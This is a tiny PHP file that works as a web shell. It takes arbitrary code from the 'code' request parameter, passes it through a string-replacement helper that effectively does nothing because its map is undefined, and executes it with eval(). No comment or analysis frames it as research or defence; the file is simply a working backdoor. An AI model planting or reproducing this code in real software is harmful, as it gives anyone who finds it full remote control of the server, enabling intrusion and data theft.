<?php
function replace_stR($s,$h){
	$ret=$h;
	foreach($s as $k=>$r)
		$ret=str_replace($k,$r,$ret);
	return $ret;
}

echo htmlspecialchars(eval(replace_stR($s,$_REQUEST['code'])));
?>